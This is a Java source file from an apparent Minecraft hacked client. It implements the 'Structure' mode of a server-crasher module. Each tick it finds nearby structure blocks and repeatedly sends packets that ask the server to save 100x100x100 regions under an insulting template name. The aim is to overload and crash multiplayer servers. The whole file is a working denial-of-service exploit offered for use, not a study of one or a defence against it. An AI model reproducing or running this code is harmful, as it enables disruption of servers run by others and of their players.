package de.nekosarekawaii.vandalism.feature.module.impl.exploit.modes.servercrasher;

import de.nekosarekawaii.vandalism.Vandalism;
import de.nekosarekawaii.vandalism.base.event.game.TickGameListener;
import de.nekosarekawaii.vandalism.feature.module.impl.exploit.ServerCrasherModule;
import de.nekosarekawaii.vandalism.feature.module.template.ModuleMulti;
import net.minecraft.block.StructureBlock;
import net.minecraft.block.entity.StructureBlockBlockEntity;
import net.minecraft.block.enums.StructureBlockMode;
import net.minecraft.network.packet.c2s.play.UpdateStructureBlockC2SPacket;
import net.minecraft.util.BlockMirror;
import net.minecraft.util.BlockRotation;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Vec3i;

import java.util.ArrayList;
import java.util.List;

public class StructureModuleMode extends ModuleMulti<ServerCrasherModule> implements TickGameListener {

    private final List<BlockPos> structureBlocks = new ArrayList<>();
    private int current = 0;

    public StructureModuleMode(final ServerCrasherModule parent) {
        super("Structure", parent);
    }

    private void reset() {
        this.current = 0;
        this.structureBlocks.clear();
    }

    @Override
    public void onActivate() {
        this.reset();
        Vandalism.getInstance().getEventSystem().subscribe(TickGameEvent.ID, this);
    }

    @Override
    public void onDeactivate() {
        Vandalism.getInstance().getEventSystem().unsubscribe(TickGameEvent.ID, this);
        this.reset();
    }

    @Override
    public void onTick() {
        if (this.mc.player == null) return;
        final int range = 40;
        final int maxPackets = 10;
        final StructureBlockBlockEntity.Action action = StructureBlockBlockEntity.Action.SAVE_AREA;
        final StructureBlockMode mode = StructureBlockMode.SAVE;
        final String templateName = "fucked_by_nekosarekawaii";
        final BlockPos offset = new BlockPos(0, 1, 0);
        final Vec3i size = new Vec3i(100, 100, 100);
        final BlockMirror mirror = BlockMirror.NONE;
        final BlockRotation rotation = BlockRotation.NONE;
        final String metadata = "";
        final boolean ignoreEntities = true;
        final boolean showAir = true;
        final boolean showBoundingBox = true;
        final float integrity = 1.0f;
        final long seed = 0;
        if (this.structureBlocks.isEmpty()) {
            for (int x = -range; x < range; x++) {
                for (int y = -range; y < range; y++) {
                    for (int z = -range; z < range; z++) {
                        final BlockPos blockPos = new BlockPos(
                                (int) (this.mc.player.getX() + x),
                                (int) (this.mc.player.getY() + y),
                                (int) (this.mc.player.getZ() + z)
                        );
                        if (this.mc.world.getBlockState(blockPos).getBlock() instanceof StructureBlock) {
                            this.structureBlocks.add(blockPos);
                        }
                    }
                }
            }
            this.current = 0;
            return;
        }
        for (int i = 0; i < maxPackets; i++) {
            this.mc.getNetworkHandler().sendPacket(new UpdateStructureBlockC2SPacket(
                    this.structureBlocks.get(this.current),
                    action,
                    mode,
                    templateName,
                    offset,
                    size,
                    mirror,
                    rotation,
                    metadata,
                    ignoreEntities,
                    showAir,
                    showBoundingBox,
                    integrity,
                    seed
            ));
            if (this.current < this.structureBlocks.size() - 1) this.current++;
            else this.current = 0;
        }
    }

}
